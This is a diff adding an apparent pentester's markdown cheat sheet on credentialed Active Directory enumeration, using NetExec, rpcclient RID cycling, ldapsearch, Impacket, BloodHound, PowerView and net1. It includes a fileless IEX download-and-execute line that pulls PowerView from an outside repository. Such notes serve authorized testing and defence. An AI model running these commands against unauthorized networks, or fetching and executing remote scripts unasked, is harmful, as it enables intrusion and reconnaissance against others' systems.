@@ -1,0 +1,445 @@
+---
+Primary_category: "[[WINDOWS RECONAISSANCE]]"
+title: WINDOWS CREDENTIALED ENUMERATION
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+  - card-list
+  - purple-style
+---
+
+###### PRIMARY CATEGORY → [[WINDOWS RECONAISSANCE]]
+
+#### Components ⟡
+
+- ![](https://99px.ru/sstorage/86/2018/02/image_861602180019251883900.gif)
+	- [[WINDOWS REVERSIBLE ENCRYPTION|REVERSIBLE ENCRYPTION]]
+- ![](https://99px.ru/sstorage/86/2018/02/image_861602180019251883900.gif)
+	- [[WINDOWS REMOTE ACCESS|REMOTE ACCESS]]
+- ![](https://99px.ru/sstorage/86/2018/02/image_861602180019251883900.gif)
+	- [[WINDOWS DESCRIPTION FIELDS|DESCRIPTION FIELDS]]
+- ![](https://99px.ru/sstorage/86/2018/02/image_861602180019251883900.gif)
+	- [[WINDOWS PASSWD_NOTREQD|PASSWD_NOTREQD]]
+	
+<br>
+
+---
+
+#### Components ⟡
+
+> ***Tools***
+
+- ![](https://media0.giphy.com/media/26xBQxJc5JzAtLx1C/giphy.gif?cid=6c09b952uz02zvkfe1bx3fxt82i5u7ul58fncsegw7tkzfrs&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g)
+	- [[BLOODHOUND]]
+- ![](https://media0.giphy.com/media/26xBQxJc5JzAtLx1C/giphy.gif?cid=6c09b952uz02zvkfe1bx3fxt82i5u7ul58fncsegw7tkzfrs&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g)
+	- [[POWERVIEW]]
+
+<br>
+
+---
+
+#### *Credentialed Enumeration -  UNIX-like*
+
+##### *Netexec*
+
+> ***[Netexec](https://github.com/Pennyw0rth/NetExec)***
+
+###### *Users*
+
+```bash
+nxc smb <TARGET> --username '<USER>' --password '<PASSWD>' --users | awk -v IGNORECASE=1 '/-Username-/ { v = 1 ; next } !/\[\*\]/ && v { print $5 }'
+```
+
+###### *Groups*
+
+```bash
+nxc smb <TARGET> --username '<USER>' --password '<PASSWD>' --groups
+```
+
+###### *Logged on Users*
+
+```bash
+nxc smb <TARGET> --username '<USER>' --password '<PASSWD>' --loggedon-users
+```
+
+##### *RPCclient*
+
+> ***[RPCclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)***
+
+###### *Users*
+
+> ***SAMR***
+
+```bash
+rpcclient --user '<USER>%<PASSWD>' --command 'enumdomusers' <TARGET> | grep -ioP --color -- '^user:\[\K.*?(?=\])'
+```
+
+###### *Groups*
+
+> ***SAMR***
+
+```bash
+rpcclient --user '<USER>%<PASSWD>' --command 'enumdomgroups' <TARGET> | grep -ioP --color -- '^group:\[\K.*?(?=\])'
+```
+
+###### *Users & Groups*
+
+> ***LSARPC***
+
+> ***RID Cycling***
+
+```bash
+for _rid in {500..1500} ; do rpcclient --user '<USER>%<PASSWD>' --command "lookupsids <DOMAIN_SID>-$_rid" <DC> ; done | awk -v IGNORECASE=1 '!/unknown/ { gsub(/.+\\/,"", $2) ; print $2 }'
+```
+
+##### *Lpdasearch*
+
+###### *Users*
+
+```bash
+ldapsearch -LLL -x -H 'ldap://<TARGET>' -D '<USER>@<DOMAIN>' -w '<PASSWD>' -b 'DC=<DOMAIN>,DC=<TLS>' '(ObjectClass=User)' samAccountName dn userPrincipalName cn | grep -vPi --color -- '^#.+$'
+```
+
+###### *Groups*
+
+```bash
+ldapsearch -LLL -x -H 'ldap://<TARGET>' -D '<USER>@<DOMAIN>' -w '<PASSWD>' -b 'DC=<DOMAIN>,DC=<TLD>' '(ObjectClass=Group)' samAccountName dn userPrincipalName cn | grep -vPi --color -- '^#.+$'
+```
+
+##### *Impacket's GetADUsers.py*
+
+> ***[GetADUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetADUsers.py)***
+
+> ***Users***
+
+```bash
+GetADUsers.py -dc-ip <DC> -all '<DOMAIN>/<USER>:<PASSWD>' 2> /dev/null | awk '/-{3,}/ { v=1 ; next } v { print $1 }'
+```
+
+##### *Impacket's Samrdump.py*
+
+> ***[Samrdump.py](https://github.com/fortra/impacket/blob/master/examples/samrdump.py)***
+
+> ***Users***
+
+```bash
+samrdump.py '<DOMAIN>/<USER>:<PASSWD>@<TARGET>' 2> /dev/null | awk -v IGNORECASE=1 '/AccountIsDisabled: False/ { print $1 }'
+```
+
+##### *Impacket's Lookupsid.py*
+
+> ***[Lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)***
+
+> ***Users & Groups***
+
+```bash
+lookupsid.py '<DOMAIN>/<USER>:<PASSWD>@<TARGET>'
+```
+
+##### *Windapsearch (Go version)*
+
+> ***[Go-Windapsearch](https://github.com/ropnop/go-windapsearch)***
+
+> ***Users, Computers, Groups, GPOs and so on***
+
+###### *Users*
+
+```bash
+windapsearch --domain '<DOMAIN>' --dc '<TARGET>' --username '<USER>' --password '<PASSWD>' --module users
+```
+
+###### *Groups*
+
+```bash
+windapsearch --domain '<DOMAIN>' --dc '<TARGET>' --username '<USER>' --password '<PASSWD>' --module groups
+```
+
+##### *Ldapdomaindump.py*
+
+> ***[Ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)***
+
+> ***Users, Computers, Groups, GPOs and so on***
+
+###### *Setup*
+
+```bash
+git clone https://github.com/dirkjanm/ldapdomaindump ldapdomaindump
+cd !$ && python3 -m venv .venv
+. !$/bin/activate && pip3 install .
+```
+
+###### *Usage*
+
+```bash
+mkdir domain_tld.data
+cd !$ && python3 ldapdomaindump.py --user '<DOMAIN>\<USER>' --password '<PASSWD>' --no-grep --no-json '<TARGET>'
+```
+
+```bash
+python3 -m http.server <PORT>
+```
+
+##### *BloodHound.py*
+
+> ***[BloodHound.py](https://github.com/dirkjanm/BloodHound.py)***
+
+###### *Setup*
+
+> ***Intended for BH-CE Ingestion (Not BH-Legacy)***
+
+```bash
+git clone https://github.com/dirkjanm/BloodHound.py BH.py
+cd !$ && git checkout bloodhound-ce
+python3 -m venv .venv
+. !$/bin/activate && pip3 install .
+```
+
+###### *Usage*
+
+```bash
+python3 bloodhound.py --collectionmethod All --domain '<DOMAIN>' --username '<USER>' --password '<PASSWD>' --nameserver '<DC_IP>' --domain-controller '<DC_FQDN>' --zip
+```
+
+If the *UDP port 53* of the specified nameserver is not reachable, simply add the **`-dns-tcp`** flag to force *DNS* over *TCP*
+
+```bash
+python3 bloodhound.py --collectionmethod All --domain '<DOMAIN>' --username '<USER>' --password '<PASSWD>' --nameserver '<DC_IP>' --domain-controller '<DC_FQDN>' --zip --dns-tcp
+```
+
+---
+
+#### *Credentialed Enumeration - Windows*
+
+##### *AD Powershell Module*
+
+> ***[Powershell AD Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps)***
+
+###### *Setup*
+
+```bash
+Import-Module ActiveDirectory
+```
+
+###### *Users*
+
+> ***Get-ADUser***
+
+- ***All Domain User Accounts***
+
+```bash
+Get-ADUser -Filter * | Select-Object samAccountName
+```
+
+- ***Specific Domain User Account***
+
+```bash
+Get-ADUsers -Identity <USER> # SamAccountName
+```
+
+###### *Groups*
+
+> ***Get-ADGroup***
+
+- ***All Domain Groups***
+
+```bash
+Get-ADGroup -Filter * | Select-Object samAccountName
+```
+
+- ***Specific Domain Group***
+
+```bash
+Get-ADGroup -Identity <GROUP> # SamAccountName
+```
+
+###### *Group Membership*
+
+> ***Get-ADGroupMember***
+
+```bash
+Get-ADGroupMember -Identity 'Admins. del dominio'
+```
+
+###### *Domain Info.*
+
+> ***GetADDomain***
+
+```bash
+Get-ADDomain
+```
+
+###### *Trust Relationships*
+
+```bash
+Get-ADTrust -Filter *
+```
+
+##### *Powerview*
+
+> ***[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)***
+
+> ***[Powerview.ps1 - BC Security](https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1)***
+
+###### *Setup*
+
+- ***Fileless***
+
+```bash
+IEX (New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1')
+```
+
+- ***Touching Disk***
+
+```bash
+IWR -UseBasicParsing -Uri 'https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1' -OutFile '.\powerview.ps1'
+```
+
+```bash
+Import-Module .\powerview.ps1
+```
+
+###### *Users*
+
+> ***Get-DomainUser***
+
+- ***All Domain User Accounts***
+
+```bash
+Get-DomainUser -Identity * -Domain <DOMAIN> | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+```
+
+- ***Specific Domain User Account***
+
+```bash
+Get-DomainUser -Identity <USER> -Domain <DOMAIN> | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+```
+
+###### *Groups*
+
+- ***All Domain Groups***
+
+```bash
+Get-DomainGroup
+```
+
+- ***Specific Domain Group***
+
+```bash
+Get-DomainGroup -Identity '<GROUP>'
+```
+
+###### *Group Membership*
+
+> ***Recursive i.e. Nested Group Membership Scope***
+
+> ***Get-DomainGroupMember***
+
+```bash
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+```
+
+###### *Trust Relationships*
+
+> ***Get-DomainTrustMapping***
+
+```bash
+Get-DomainTrustMapping
+```
+
+###### *Local Admin Access on a certain Domain-Joined Computer*
+
+> ***Test-AdminAccess***
+
+```bash
+Test-AdminAccess -ComputerName <TARGET>
+```
+
+##### *SharpHound*
+
+###### *SharpHound.exe*
+
+> ***CollectionMethod → All***
+
+> ***Download it from BloodHound-{CE,Legacy} GUI***
+
+```bash
+ .\SharpHound.exe All
+```
+
+##### *Living off the Land*
+
+###### *WMI*
+
+> ***[WMI CheatSheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)***
+
+###### *Net Command*
+
+> ***Net1.exe for more OPSEC***
+
+- ***Local Users***
+
+```bash
+net1 user # All Loca User Accounts
+net1 user "<USER>" # Specific Local User Account
+```
+
+- ***Domain Users***
+
+```bash
+net1 user /domain # All Domain User Accounts
+net1 user /domain "<USER>" # Specific Domain User Account
+```
+
+- ***Local Groups***
+
+```bash
+net1 localgroup # All Local Groups
+net1 localgroup "<GROUP>" # Specific Local Group
+```
+
+- ***Domain Groups***
+
+```bash
+net1 group /domain # All Domain Groups
+net1 group /domain "<GROUP>" # Specific Domain Group
+```
+
+- ***Domain Password Policy***
+
+```bash
+net1 accounts
+```
+
+###### *DSquery*
+
+> ***[DSquery](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)***
+
+> ***Local privileges required***
+
+- ***Domain Users***
+
+```bash
+dsquery user
+```
+
+- ***Domain Computers***
+
+```bash
+dsquery computer
+```
+
+- ***Custom Search via LDAP Filters***
+
+```bash
+dsquery * -Filter '<LDAP_FILTER>' -Attr '<ATTRIBUTES>'
+```
+
+---
+
+#### *References*
+
+> ***[WADComs](https://wadcoms.github.io/)***
+
+> ***[BloodHound Cypher Queries Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)***
